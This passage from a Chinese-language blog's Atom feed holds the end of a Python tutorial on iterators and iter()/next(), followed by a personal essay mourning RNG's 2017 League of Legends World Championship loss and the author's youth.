python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="keyword">from</span> collections <span class="keyword">import</span> Iterator</div><div class="line">&gt;&gt;&gt;isinstance((x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)), Iterator)</div><div class="line"><span class="keyword">True</span></div><div class="line">&gt;&gt;&gt;isinstance([], Iterator)</div><div class="line"><span class="keyword">False</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(&#123;&#125;, Iterator)</div><div class="line"><span class="keyword">False</span></div><div class="line">&gt;&gt;&gt;isinstance(<span class="string">'abc'</span>, Iterator)</div><div class="line"><span class="keyword">False</span></div><div class="line">把list、dict、str等Iterable变成Iterator可以使用iter()函数：</div><div class="line">&gt;&gt;&gt;isinstance(iter([]), Iterator)</div><div class="line"><span class="keyword">True</span></div><div class="line">&gt;&gt;&gt;isinstance(iter(<span class="string">'abc'</span>), Iterator)</div><div class="line"><span class="keyword">True</span></div></pre></td></tr></table></figure></p><p>Iterator对象表示一个数据流，不能提起知道序列的长度，其计算为惰性的，只有在需要下一个返回值的时候才会计算</p><p>可作用于for的对象都是Iterable类型<br>可作用于next()的都是Iterator类型<br>for循环本质上就是通过不断调用next()函数实现的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]:</div><div class="line"><span class="keyword">pass</span></div></pre></td></tr></table></figure></p><p>实际上完全等价于：<br>首先获得Iterator对象:<br>    it = iter([1, 2, 3, 4, 5])<br>循环:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="comment"># 获得下一个值:</span></div><div class="line">x = next(it)</div><div class="line"><span class="keyword">except</span> StopIteration:</div><div class="line"><span class="comment"># 遇到StopIteration就退出循环</span></div><div class="line"><span class="keyword">break</span></div></pre></td></tr></table></figure></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>凡是可作用于for循环的对象都是Iterable类型；<br>凡是可作用于next()函数的对象都是Iterator类型，它们表示一个惰性计算的序列；<br>集合数据类型如list、dict、str等是Iterable但不是Iterator，不过可以通过iter()函数获得一个Iterator对象。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;切片&quot;&gt;&lt;a href=&quot;#切片&quot; class=&quot;headerlink&quot; title=&quot;切片&quot;&gt;&lt;/a&gt;切片&lt;/h1&gt;&lt;p&gt;取list或者tuple的部分元素&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>纪念我逝去的青春</title>
    <link href="https://www.twosmi1e.com/2017/10/28/%E7%BA%AA%E5%BF%B5%E6%88%91%E9%80%9D%E5%8E%BB%E7%9A%84%E9%9D%92%E6%98%A5/"/>
    <id>https://www.twosmi1e.com/2017/10/28/纪念我逝去的青春/</id>
    <published>2017-10-28T15:14:35.000Z</published>
    <updated>2018-08-02T16:24:10.402Z</updated>
    
    <content type="html"><![CDATA[<p>  &nbsp;&nbsp;当第五局开场Sliver&nbsp;Scrapes响起的时候，我已经想到了RNG赢下比赛去往鸟巢的场景，我还以为所有那五个满身热血的少年最后能成功饮血屠龙。<br>  &nbsp;&nbsp;看到最后只剩两个人，小狗被追上高地letme最后冲过来两个人死在一起的时候，真的心中一凉，原来真的 青春不一定会圆满啊。</p><p>  &nbsp;&nbsp;这个BO5，看到了小狗的vn，看到了letme的纳尔，看到了虎九万的飞机，看到了香锅两把MVP的表现，真的足够了，唯一遗憾的就是没能打败SKT<br>晋级总决赛吧。</p><p>  &nbsp;&nbsp;从S2到S7，五年了，初中时刚刚知晓英雄联盟，和同学一起去黑网吧打人机还打的津津有味。高中那时进一个网吧清一色的英雄联盟，中午觉都不睡去打一把就是为了拿首胜买英雄，逃晚自习逃课和同学一起出去双排，最开心的事情就是和一群兄弟一起去网吧五黑，那时的微笑，草莓，若风，那时的WE，都是回忆啊。今年可以说是LPL最有希望的一年，是RNG最有希望的一年，在家门口打比赛，所有玩过英雄联盟的人都在关注着，为LPL加油，这也是ADC强势的版本，小狗状态也很好，天时地利人和，真的希望RNG全华班能夺冠，买上一个冠军皮肤，然后打上两把告别召唤师峡谷。当初一起玩LOL的人都已经陆续离开了，守望先锋，绝地求生，或是不玩游戏了，毕竟都已经长大了，据说S8还要改符文系统，我已经没有那么多精力再去适应新版本再去玩游戏了吧，所以可能S7就是最后一次追这赛事了吧，和LPL一起逝去的，是那些回忆那些青春啊！<br>  &nbsp;&nbsp;ROYAL NERVER GIVE UP！今天RNG是站着死的，不想喷任何人，也不想他们被喷，在我心中香锅就是世界第一打野，世界上只有一个VN叫uzi，谁说LPL只有蓝领型上单我们有letme，ming的凤女洛都曾带来精彩的表演，还有单杀faker的虎将军，你们，真的已经很棒了。<br>  &nbsp;&nbsp;曾在比赛之前想，如果S7LPL夺冠了，会带来什么？英雄联盟又能多火几年。但这对于我来说，对于我们这些从S1，S2开始的老玩家来说，这是一次青春的完美谢幕，为我那曾经逃课上网的网瘾少年的时光，画上一个圆满的句号。可是不如意事常八九，不可能总是事事圆满。<br>  &nbsp;&nbsp;传奇还在继续，Legend&nbsp;never&nbsp;die，希望LPL不要放弃</p><p>  &nbsp;&nbsp;今夜再矫情一次，再中二一次，再难过地哭一次，为与胜利失之交臂的RNG，也为我逝去的青春。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;  &amp;nbsp;&amp;nbsp;当第五局开场Sliver&amp;nbsp;Scrapes响起的时候，我已经想到了RNG赢下比赛去往鸟巢的场景，我还以为所有那五个满身热血的少年最后能成功饮血屠龙。&lt;br&gt;  &amp;nbsp;&amp;nbsp;看到最后只剩两个人，小狗被追上高地letme最后冲过来
      
    
    </summary>
    
    
      <category term="随笔" scheme="https://www.twosmi1e.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
